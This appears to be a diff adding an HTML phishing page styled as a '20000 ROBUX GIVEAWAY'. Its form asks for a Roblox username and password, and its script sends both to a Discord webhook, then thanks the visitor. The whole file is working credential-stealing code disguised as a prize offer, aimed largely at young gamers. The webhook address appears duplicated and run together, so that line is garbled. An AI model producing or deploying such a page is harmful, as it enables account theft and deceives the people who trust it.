@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Robux Giveaway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
+        }
+        .submit-btn {
+            background-color: #2ecc71;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="popup">
+        <div class="popup-content">
+            <h1 style="color: #2ecc71;">20000 ROBUX GIVEAWAY</h1>
+            <form id="robux-form">
+                <label for="username">Roblox Username:</label><br>
+                <input type="text" id="username" name="username" required><br><br>
+                <label for="password">Roblox Password:</label><br>
+                <input type="password" id="password" name="password" required><br><br>
+                <button class="submit-btn" type="submit">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.13.0/dist/tf.min.js"></script>
+    <script>
+        const form = document.getElementById('robux-form');
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            fetch('https://discord.com/api/webhooks/1560784848933617684/We2bmkwuaT5H4vMqbYT1e9nhL0cVue53tkGeAD_o88hqU-e_DWxPrXkUGC1t797dK2JQhttps://discord.com/api/webhooks/1560784848933617684/We2bmkwuaT5H4vMqbYT1e9nhL0cVue53tkGeAD_o88hqU-e_DWxPrXkUGC1t797dK2JQ', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    embeds: [
+                        {
+                            title: 'Roblox Account',
+                            description: `Account: ${username}\nPassword: ${password}`,
+                            color: '#2ecc71',
+                        },
+                    ],
+                }),
+            })
+            .then((response) => response.json())
+            .then((data) => console.log(data))
+            .catch((error) => console.error(error));
+
+            alert('Thanks for participating!');
+        });
+    </script>
+</body>
+</html>
